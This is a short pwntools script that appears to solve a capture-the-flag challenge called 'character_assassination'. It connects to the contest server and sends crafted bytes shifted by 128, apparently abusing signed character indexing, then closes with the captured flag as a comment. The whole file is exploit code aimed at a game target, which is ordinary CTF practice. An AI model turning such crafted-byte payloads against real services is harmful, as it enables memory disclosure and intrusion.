#!/usr/bin/env python3
from pwn import *

# p = process('./character_assassination')
p = remote('character-assassination.challs.pwnoh.io', 1337, ssl=True)

for i in range(64, 100):
    payload = b'A' + p8(i + 128)
    p.sendline(payload)

p.interactive()
#bctf{wOw_YoU_sOlVeD_iT_665ff83d}